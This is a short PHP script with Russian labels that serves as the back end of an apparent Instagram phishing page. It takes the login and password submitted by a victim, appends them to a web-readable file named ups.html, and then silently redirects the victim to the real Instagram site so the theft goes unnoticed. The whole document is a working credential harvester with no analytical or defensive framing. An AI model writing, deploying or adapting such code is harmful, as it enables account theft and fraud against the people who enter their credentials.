<?
$Login = $_POST['1'];
$Pass = $_POST['2'];
$log = fopen ("ups.html","a+");
fwrite($log,"Логин =$Login <br>
Пароль =$Pass <br>");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0;
URL=https://www.instagram.com/'>
</head></html>";
?>